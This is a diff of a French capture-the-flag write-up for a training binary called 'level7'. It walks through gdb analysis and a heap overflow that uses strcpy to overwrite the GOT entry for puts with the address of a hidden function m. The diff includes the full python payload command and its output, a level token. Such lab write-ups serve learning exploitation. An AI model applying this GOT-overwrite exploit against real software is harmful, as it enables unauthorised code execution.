@@ -1,8 +1,8 @@
 # Level7
 
-On observe un executable a la racine `level7`
+On observe un exécutable à la racine : `level7`
 
-```bash
+```shell
 $ ./level7
 Segmentation fault (core dumped)
 
@@ -13,9 +13,9 @@ $ ./level7 "Hello" "World"
 ~~
 ```
 
-On cherche donc a comprendre ce que fait l'executable
+On cherche donc à comprendre ce que fait l'exécutable
 
-```bash
+```shell
 $ gdb level7 -q
 Reading symbols from /home/user/level7/level7...(no debugging symbols found)...done.
 (gdb) set disassembly-flavor intel
@@ -95,25 +95,25 @@ Dump of assembler code for function m:
 End of assembler dump.
 ```
 
-On va utiliser `Cutter` pour avoir un idee plus clair de `level7`
+On va utiliser `Cutter` pour avoir une idée plus claire de `level7`
 
-```bash
+```shell
 $ scp -P 4242 -r level7@192.168.56.102:/home/user/level7/level7 .
 
 $ ./Cutter-v2.1.2-Linux-x86_64.AppImage level7
 ```
 
-_resultat sauvegarde dans [source.md](source.md)_
+_résultat sauvegardé dans [source.md](source.md)_
 
-On cherche a faire pointer la fonction `puts` vers la fonction `m`
+On voit dans le main que le fichier contenant le token du niveau suivant est lu et stocké dans la variable `c`. On voit également une fonction `m`, non appelée qui va afficher le contenu de la variable `c`.
+
+On cherche donc faire pointer la fonction `puts` vers la fonction `m`, en modifiant la `GOT`
 
 Pour cela, nous nous servons du premier `strcpy` pour modifier l'adresse
-d'ecriture du second `strcpy` vers le `puts` qui est a l'adresse `0x8049928`
+d'écriture du second `strcpy` vers le `puts` qui est à l'adresse `0x8049928`, et ensuite nous allons modifier
+la valeur à cette adresse pour pointer vers la fonction `m`.
 
-Maintenant que le second `strcpy` est dirige vers le puts, nous allons modifier
-la valeur a cette adresse pour pointer vers la fonction `m`
-
-```bash
+```shell
 (gdb) break *main+21
 Breakpoint 1 at 0x8048536
 (gdb) break *main+68
@@ -132,19 +132,14 @@ eax            0x804a028	134520872
 
 <code>0x804a028 - 0x804a008 = 20<sub>16</sub></code>
 
-Nous avons notre premier parametre `python -c 'print ("A"*20) + "\x28\x99\x04\x08"'`
+Nous avons notre premier paramètre `python -c 'print ("A"*20) + "\x28\x99\x04\x08"'`
 
-Notre deuxieme parametre est l'adresse de la fonction `m` `\xf4\x84\x04\x08`
+Notre deuxième paramètre est l'adresse de la fonction `m` `\xf4\x84\x04\x08`
 
-Plus qu'a regrouper toute nos string et a essayyer
+Plus qu'à regrouper toute nos string et à essayer
 
-```bash
+```shell
 $ ./level7 `python -c 'print ("A"*20) + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1670340479
-
-level7:$ su level8
-Password:
-
-level8:$
 ```
